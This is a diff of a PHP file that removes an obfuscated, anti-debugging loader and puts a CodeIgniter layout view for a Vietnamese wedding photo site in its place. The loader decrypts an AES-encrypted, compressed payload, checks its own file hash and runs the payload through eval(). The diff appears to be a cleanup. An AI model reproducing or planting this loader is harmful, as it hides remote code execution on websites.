@@ -1,28 +1,42 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_q0wy2og8=('bas'.'e64'.'_de'.'cod'.'e');
-$_q56ol4p2=('gzu'.'nco'.'mpr'.'ess');
-$_u3aes13d=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_b8kzxur1='O93fkjlt63Q=';
-$_kl6l15mj='7z2ciNH9';
-$_gu43oqr4='xBRfBibP';
-$_ieob15ef='0P9nelTi';
-$_d35o2m79='6U1Ecbcm';
-$_d05n5z5j='daZrEg==';
-$_f10wyt5y='v7Cnq2k9';
-$_k57z1eyx='3WvNLmnG';
-$_a7pbelqv=$_q0wy2og8($_d35o2m79.$_kl6l15mj.$_ieob15ef.$_gu43oqr4.$_b8kzxur1);
-$_ftlt15vp=$_q0wy2og8($_f10wyt5y.$_k57z1eyx.$_d05n5z5j);
-$_axey1bea=$_q0wy2og8('rwjTnNNf8Yn06e/CW22bHJjos+3l70DhJUMVNAayx8sreoklT8Uq4NQPTlo3RE8pjAWoULpZ3GOmOWwHxUnPqXbWn6adFEoIaGZZo/rZkimJbSJPZ2eQ72Q9v7n3TfEFSuAEUElPeLj88Xo5fHJZeyPzBCyL92yQcZhRr0o/+dquqwEsTzSa2UZStrjHWEzQm8T/1q/JY/jFmKcXRjvrwYEWu0jwOUNaJFNgt0OJ4LhQdrjZM9ubVtNYZRPIEWtd4v0aHEUpDRku4qXc7yDcwn/CWWVeSerTZcdRt7cISdWLghHFxAP7W1Fmn13wXHc9e0RwXu0RoIaPe6UM0a8p2EVGDHXpkimqkkVkxRgqwPxnFLQj3E745Hobjw7N9zcBl87Fb+MGdZyc6FYehXQFYf3VKy8AfcXdqab5IrTFiW3MeidJFJZH6uxJGG+jIP4tBamatgicRxVIXgDJYmlrArzlISw4FUAoK0XArxHx6bL5rthS+x52pIf24ABsWDPFjB2wTeRV6WIDYDSVLiRRckt6Tx1uwh77eAoGp2lzWIUwngBaKZjJzpZm63NYApG1tAB6CG+vqAoFARgR9Z+0wwRvPvnjZLlZwOlT8OciNLzC+xJE9un+1OJCuSdLJ94kKxsAGE0I660or1pYF4O71eZXTy0mFve3kZNjyPgKxJp5XI6WItj/NDqDB0mUJy2LAT3tNd1SULUjulZJoHgfnK4iOYWwF8dTD8EynXhm2oMexM/Ndj4nfmEvbQu1srf4Oqy6UdTZ1y9AvH2zOobq+yMVrai/Ki68hcjSuWQF+3chnYVQJSxB76Y4tRMuoc+ZNytt8lJZEPsaYFSWWd5s++cg4ES55XEy/TJgmhcIzDaDQf4G/JypwwznEpc4DPcfVmc8wAUAyMyl+hXOmJjKsYTeL4Y+T7FGKxq0qWNj1f6KVT60/RvX7zgquw3oefM0WI49k6Jp+qxgMJ2cbNtEMjyrDQsE7bKmM+L3EpaEvFwU2SjS/5rsS02O+CzCg1wHOSrFkGXBs6cVqcXRWX1paVaqBx4wgax4yP9SRwPctJgqe031jYuN0MAI5PONMH93J7InCSF51TiLOsivDQq+UprMAtBEfYA2zFSJJ/zf7w4JH5BJ1i0NUbSfBc9ARERnwDGwfugw0tf5qO1UFADakNC1msnbKvoOM9kUTl7stQt4wyEhhhGbBb9cLsRv+Gs4dUhPCwDYWsUOz5L8f/A//X3jFLTqT650i9uQrEEX8MK5fqkELWQ3mU8yWnF9/e8qXx+A4odTKlUjQTITGX0S65hrW+t8uwbhAqdOISPoE0WI7UKYBjEJ45JHLXv7emUcrAdk9SJu1vI/Bc4I1ksqCJxOEri1H1PDb0VITRSqUf98hatADbLKew0xoeUuQ06djyibUZWTzvaUjPJfyESWAb2kiS+dJ0wa1e8dZ6wlpxb/eKBzy8JT80nPbdaDip1N6Xqmaf0OgDnxZlXxUrRzmEy1mx4vftkRoYZfPeLj1juG7VhYAv6zY5eg1jq1hkfE+PNa2Jd0Yg2tAWPyJRv1iI4U2+5Vqy4kT+XhfA1UfwZo+OiI1eoaM0/SNYkaAlFsD18J9wqmi8/wajJ/0j2Y/hjYDktJOuudPzGEI0hk2luXJxOy80TCN47ek+x1SizZzTKU5Ia0ZXxXGndZC+1OpQ==');
-$_ozqkbbyp=$_u3aes13d($_axey1bea,'aes-256-cbc',$_a7pbelqv,OPENSSL_RAW_DATA,$_ftlt15vp);
-if($_ozqkbbyp===false){exit;}
-$_hkj50urp=$_q56ol4p2($_ozqkbbyp);
-if($_hkj50urp===false){exit;}
-$_jq303di5='a0e50a225c7ec54ccee7f4819039c7b8cba795152cf0df05e65b4c0bf45057c9';
-$_t42tn81k=@file_get_contents(__FILE__);
-if($_t42tn81k!==false){
-$_qqxg4zsh=str_replace($_jq303di5,"0000000000000000000000000000000000000000000000000000000000000000",$_t42tn81k);
-$_qvcf86xc=hash("sha256",$_qqxg4zsh);
-if($_qvcf86xc!==$_jq303di5){@http_response_code(403);exit;}
-}
-eval($_hkj50urp);
+ defined('BASEPATH') OR exit('No direct script access allowed');
+$this->load->view('partials/head', array('pub_theme' => TRUE));
+
+$home = isset($home_path) ? (string) $home_path : ''; ?>
+<body class="pub">
+<header class="pub-nav">
+  <a class="pub-brand" href="<?= base_url($home) ?>"><?= e($couple) ?></a>
+  <nav>
+    <a href="<?= base_url($home . '#gallery') ?>"><?= e(__('Album')) ?></a>
+    <?php if ($settings['guest_upload'] === '1'): ?><a href="<?= base_url('gui-anh') ?>"><?= e(__('Gửi ảnh')) ?></a><?php endif; ?>
+    <?php if ($settings['wishes_enabled'] === '1'): ?><a href="<?= base_url($home . '#loi-chuc') ?>"><?= e(__('Lời chúc')) ?></a><?php endif; ?>
+    <?php if ($is_admin): ?><a class="pub-admin" href="<?= base_url('admin') ?>"><?= e(__('Quản trị')) ?></a><?php endif; ?>
+    <?= lang_switch_html() ?>
+  </nav>
+</header>
+<?php $this->load->view('partials/flash'); ?>
+<main>
+<?php $this->load->view($content_view); ?>
+</main>
+<footer class="pub-foot">
+  <p><?= e($couple) ?><?php if ($settings['wedding_date']): ?> · <?= e(vn_date($settings['wedding_date'], FALSE)) ?><?php endif; ?></p>
+  <?php 
+$cr_gh = '<svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>';
+$cr_rings = '<svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="9" cy="13" r="6"/><circle cx="15" cy="13" r="6"/><path d="M12 4l-1.5 3h3z"/></svg>'; ?>
+</footer>
+<?php $this->load->view('partials/lightbox'); ?>
+<?php
+// Trang con của trang cưới (album, gửi ảnh) phát tiếp nhạc nền; trang khóa/404/"đang chuẩn bị" thì không.
+$pub_music = in_array($content_view, array('public/album', 'public/album_locked', 'public/upload', 'public/upload_closed'), TRUE)
+? $content->music() : NULL;
+if ($pub_music): ?>
+<div class="music" data-music data-autoplay="<?= $settings['music_autoplay'] === '1' ? '1' : '0' ?>">
+  <button type="button" class="music-btn" aria-label="<?= e(__('Bật/tắt nhạc')) ?>" data-music-toggle>♫</button>
+  <audio src="<?= e($pub_music['url']) ?>" loop preload="none"></audio>
+  <span class="music-hint" data-music-hint hidden>♫ <?= e(__('Chạm để nghe nhạc')) ?></span>
+</div>
+<?php endif; ?>
+<script src="<?= asset_url('js/app.js') ?>"></script>
+<?php if ($pub_music): ?><script src="<?= asset_url('js/music.js') ?>"></script><?php endif; ?>
+</body>
+</html>
